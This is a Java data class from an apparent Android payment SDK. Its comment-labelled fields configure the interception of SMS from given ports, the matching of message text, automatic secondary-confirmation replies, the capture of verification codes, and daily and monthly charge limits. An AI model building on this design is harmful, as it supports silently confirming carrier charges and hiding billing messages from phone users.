package com.klw.fastfun.pay.common.domain;

import java.io.Serializable;

public class ResSDKFilter implements Serializable {
	/***
	 * 
	 */
	private static final long serialVersionUID = 1L;
	
	/** 需要拦截短信的端口 */
	private String filter_port;
	/** 拦截类型 */
	private String r_type;
	/** 匹配的字符串 */
	private String match;
	/** 回发的目标地址 */
	private String r_addr;
	/** 回复广播；wap1，com.k.wap1 */
	private String r_rec;
	/** 回复url */
	private String r_url;
	/** 二次确认发送的内容 */
	private String r_cont;
	/** 匹配的前面的内容 */
	private String r_start;
	/** 匹配的后面的内容 */
	private String r_end;
	/** 对应的扣费代码id 二次确认有用 */
	private String orderid;
	/** 是否需要拿到验证码 */
	private String getkeyword;
	/** 日限 */
	private int day_limit;
	/** 月限 */
	private int month_limit;
	/** 日月限开关 */
	private int pay_limit_open;
	
	public String getR_rec() {
		return r_rec;
	}
	public void setR_rec(String r_rec) {
		this.r_rec = r_rec;
	}
	public String getR_url() {
		return r_url;
	}
	public void setR_url(String r_url) {
		this.r_url = r_url;
	}
	public String getOrderid() {
		return orderid;
	}
	public void setOrderid(String orderid) {
		this.orderid = orderid;
	}
	public String getGetkeyword() {
		return getkeyword;
	}
	public void setGetkeyword(String getkeyword) {
		this.getkeyword = getkeyword;
	}
	public int getDay_limit() {
		return day_limit;
	}
	public void setDay_limit(int day_limit) {
		this.day_limit = day_limit;
	}
	public int getMonth_limit() {
		return month_limit;
	}
	public void setMonth_limit(int month_limit) {
		this.month_limit = month_limit;
	}
	public int getPay_limit_open() {
		return pay_limit_open;
	}
	public void setPay_limit_open(int pay_limit_open) {
		this.pay_limit_open = pay_limit_open;
	}
	public String getFilter_port() {
		return filter_port;
	}
	public void setFilter_port(String filter_port) {
		this.filter_port = filter_port;
	}
	public String getR_type() {
		return r_type;
	}
	public void setR_type(String r_type) {
		this.r_type = r_type;
	}
	public String getMatch() {
		return match;
	}
	public void setMatch(String match) {
		this.match = match;
	}
	public String getR_addr() {
		return r_addr;
	}
	public void setR_addr(String r_addr) {
		this.r_addr = r_addr;
	}
	public String getR_cont() {
		return r_cont;
	}
	public void setR_cont(String r_cont) {
		this.r_cont = r_cont;
	}
	public String getR_start() {
		return r_start;
	}
	public void setR_start(String r_start) {
		this.r_start = r_start;
	}
	public String getR_end() {
		return r_end;
	}
	public void setR_end(String r_end) {
		this.r_end = r_end;
	}
	

}
